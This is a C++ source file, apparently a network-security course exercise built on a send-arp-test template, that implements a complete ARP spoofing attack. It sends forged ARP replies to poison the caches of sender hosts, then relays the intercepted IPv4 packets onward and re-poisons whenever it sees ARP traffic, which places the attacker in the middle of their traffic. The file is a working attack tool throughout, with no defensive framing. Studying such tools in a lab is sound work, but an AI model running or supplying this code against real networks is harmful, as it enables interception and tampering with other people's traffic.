// ------------------------------------------------------------
// orignal source : https://gitlab.com/gilgil/send-arp-test
// Author: Gilgil
// Last update: 2020.05.06
// ------------------------------------------------------------
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "get_my_addr.h"
#include <vector>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

// packet template
EthArpPacket packet_make(Mac ETH_dmac, Mac ETH_smac, Mac ARP_smac, Mac ARP_tmac, Ip ARP_sip, Ip ARP_tip, int type) {

    EthArpPacket packet;

    packet.eth_.dmac_ = ETH_dmac;
    packet.eth_.smac_ = ETH_smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    // request = 1 , reply = 2
    if (type == 1) {
        packet.arp_.op_ = htons(ArpHdr::Request);
    } else if (type == 2) {
        packet.arp_.op_ = htons(ArpHdr::Reply);
    } else {
        printf("Invalid type\n");
        exit(1);
    }

    packet.arp_.smac_ = ARP_smac;
    packet.arp_.sip_ = htonl(ARP_sip);
    packet.arp_.tmac_ = ARP_tmac;
    packet.arp_.tip_ = htonl(ARP_tip);

    return packet;
}

Mac getMac(pcap_t *handle, Mac my_Mac, Ip my_Ip, Ip senderIp) {
    EthArpPacket packet;
    packet = packet_make(Mac("ff:ff:ff:ff:ff:ff"), my_Mac, my_Mac, Mac("00:00:00:00:00:00"), my_Ip, senderIp,
                         1); // request packet to victim

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    EthArpPacket *recvPacket = NULL;
    while (true) {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        recvPacket = (struct EthArpPacket *) packet;
        if (recvPacket->eth_.type_ != htons(EthHdr::Arp))
            continue;  // not arp packet
        if (recvPacket->arp_.op_ != htons(ArpHdr::Reply))
            continue;  // not arp reply packet
        if (recvPacket->arp_.sip_ != htonl(senderIp))
            continue;

        break;

    }
    return Mac(recvPacket->arp_.smac_);
}

int main(int argc, char *argv[]) {
    // check args
    // many input case
    if (argc < 4 || (argc & 1) == 1) {
        usage();
        return -1;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); // 1: promiscuous mode, 1: timeout

    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // get my mac address 
    char my_mac_str[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    get_my_mac(my_mac_str, dev);
    Mac my_Mac = Mac(my_mac_str);

    // get my ip address
    char my_ip_str[4] = {0x00, 0x00, 0x00, 0x00};
    get_my_ip(my_ip_str, dev);
    Ip my_Ip = Ip(my_ip_str);

    // get sender ip address
    std::vector<std::pair<Ip, Ip>> ip_pair;
    std::vector<std::pair<Mac, Mac>> mac_pair;

    // get many input case
    for (int i = 2; i < argc; i += 2) {
        ip_pair.push_back(std::make_pair(Ip(argv[i]), Ip(argv[i + 1])));
        mac_pair.push_back(std::make_pair(getMac(handle, my_Mac, my_Ip, (Ip) argv[i]),
                                          getMac(handle, my_Mac, my_Ip, (Ip) argv[i + 1])));
    }
    
    // print input case result
    for ( int i = 0; i < ip_pair.size(); i++ ) {
        printf("[session %d] serder Ip : %s Mac : %s\n", i, ip_pair[i].first.operator std::string().c_str(), mac_pair[i].first.operator std::string().c_str());
        printf("[session %d] target Ip : %s Mac : %s\n", i,  ip_pair[i].second.operator std::string().c_str(), mac_pair[i].second.operator std::string().c_str());
    }

    // ARP infection
    EthArpPacket packet;
    for (int i = 0; i < ip_pair.size(); i++) {
        packet = packet_make(mac_pair[i].first, my_Mac, my_Mac, mac_pair[i].first, ip_pair[i].second, ip_pair[i].first, 2);
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        printf("[session %d] %s ARP infect \n", i, ip_pair[i].first.operator std::string().c_str());
    }

    // relay while loop
    while(true)
    {
        struct pcap_pkthdr* header;
        const  u_char*      packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthHdr*      spoof_Packet = (EthHdr*)packet;
        bpf_u_int32  spoof_PacketSize = header->caplen;

        // check packet with session list
        for(int i = 0; i < ip_pair.size(); i++)
        {
            // spoof_Packet mac addr != session sender mac addr
            if(spoof_Packet->smac() != mac_pair[i].first)
                continue;
            // spoof_Packet dst mac != my mac
            if(spoof_Packet->dmac() != my_Mac)
                continue;
            // spoof_Packet type == tcp
            if(spoof_Packet->type() == EthHdr::Ip4)
            {
                // dst mac -> target MAC
                spoof_Packet->dmac_ = mac_pair[i].second;
                // src mac -> my MAC
                spoof_Packet->smac_ = my_Mac;

                // relay packet send
                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoof_Packet), spoof_PacketSize);
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
                printf("[session %d] spoof packet relayed: %u bytes \n", i, spoof_PacketSize);
            }
            // re infect ARP packet
            if(spoof_Packet->type() == EthHdr::Arp)
            {
                printf( "ARP packet is re-infected\n");
                EthArpPacket packet;
                for (int i = 0; i < ip_pair.size(); i++) {
                    packet = packet_make(mac_pair[i].first, my_Mac, my_Mac, mac_pair[i].first, ip_pair[i].second, ip_pair[i].first, 2);
                    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
                    if (res != 0) {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                    }
                }

            }
        }
    }
    // vactor reset and free;
    ip_pair.clear();
    mac_pair.clear();
    pcap_close(handle);
}
